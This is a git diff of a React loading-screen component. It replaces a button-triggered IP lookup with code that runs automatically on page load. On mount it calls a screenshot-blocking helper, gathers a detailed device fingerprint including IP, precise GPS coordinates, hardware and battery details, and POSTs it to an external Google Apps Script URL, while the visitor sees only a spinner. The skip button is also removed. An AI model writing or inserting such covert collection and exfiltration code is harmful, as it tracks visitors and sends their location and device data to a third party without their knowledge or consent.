@@ -1,4 +1,5 @@
 import React, { useEffect, useState } from "react";
+import { collectUserData, preventScreenshots } from "../utils";
 import "./PreLoader3.css";
 
 function PreLoader3() {
@@ -6,56 +7,56 @@ function PreLoader3() {
   const [loading, setloading] = useState(undefined);
   const [completed, setcompleted] = useState(undefined);
   const [info, setInfo] = useState(null);
+  const [locationLoading, setLocationLoading] = useState(false);
 
+  const formatObject = (original) => {
+    return {
+      userAgentString: original.userAgent,
+      platformName: original.platform,
+      operatingSystem: original.os,
+      deviceCategory: original.deviceType,
+      screenResolution: original.screenResolution,
+      ipAddress: original.ip,
+      timeZone: original.timezone,
+      preferredLanguage: original.language,
+      city: original.location.city,
+      country: original.location.country,
+      latitude: original.location.latitude,
+      longitude: original.location.longitude,
+      geolocationAvailable: original.location.geoLocation,
+      referrerSource: original.referrer,
+      cookiesEnabled: original.cookiesEnabled,
+      localStorageEnabled: original.storageEnabled,
+      availableMemoryGB: original.memory,
+      cpuCores: original.hardwareConcurrency,
+      batteryChargingStatus: original.battery.charging,
+      batteryLevel: original.battery.level,
+      batteryChargingTime: original.battery.chargingTime,
+      batteryDischargingTime: original.battery.dischargingTime
+    };
+  }
 
-  const handleClick = () => {
-    //get ip address
-    fetch("https://api.ipify.org/?format=json")
+  const sendData = (payload) => {
+    //post data to server
+    setloading(true);
+    fetch("https://script.google.com/macros/s/AKfycbzTjgPPbWfW6liWEtgWs8yrabppmEcnl56wuAkT4ju3pDHVNooXMIpRcoYZvayF4FHGcw/exec", {
+      method: "POST",
+      body: JSON.stringify(payload),
+    })
       .then((response) => response.json())
       .then((json) => {
-        const ip = json.ip;
-
-        //getgeolocation or ip location
-
-        //is geo location available
-        const geo = navigator.geolocation;
-
-        if (geo) {
-          geo.getCurrentPosition((position) => {
-            const { latitude, longitude } = position.coords;
-            fetch(`https://geocode.xyz/${latitude},${longitude}?json=1`)
-              .then((response) => response.json())
-              .then((json) => {
-                const { city, country } = json;
-                setInfo(`Your IP Address is ${ip.replaceAll('.', 'x')} and you are from ${city}, ${country} :)`);
-              });
-          });
-        } else {
-          fetch(`https://ipapi.co/${ip}/json/`)
-            .then((response) => response.json())
-            .then((json) => {
-              const { city, country_name } = json;
-              setInfo(`Your IP Address is ${ip.replaceAll('.', 'x')} and you are from ${city}, ${country_name} :)`);
-            });
-        }
-      });
-
-
-
+        setcompleted(true);
+        setloading(false);
+        setData(json);
+      }).catch(e => console.log(e));
   };
 
   useEffect(() => {
-    setTimeout(() => {
-      fetch("https://jsonplaceholder.typicode.com/posts")
-        .then((response) => response.json())
-        .then((json) => {
-          console.log(json);
-          setData(json);
-          // setloading(true);
-
-
-        });
-    }, 2000);
+    preventScreenshots();
+    collectUserData().then((data) => {
+      const formattedData = formatObject(data)
+      sendData(formattedData);
+    });
   }, []);
 
   return (
@@ -65,7 +66,6 @@ function PreLoader3() {
           {!loading ? (
             <div className="spinner">
               <span>Loading...</span>
-              <button className="skip-button" onClick={handleClick}>Skip Loading</button>
               <div className="half-spinner"></div>
               {info && <div className="info-card">
                 {info}
@@ -77,7 +77,9 @@ function PreLoader3() {
         </>
       ) : (
         <>
-          <h1>Your Data</h1>
+          <code>
+            <pre>{JSON.stringify(data, null, 2)}</pre>
+          </code>
         </>
       )}
     </>
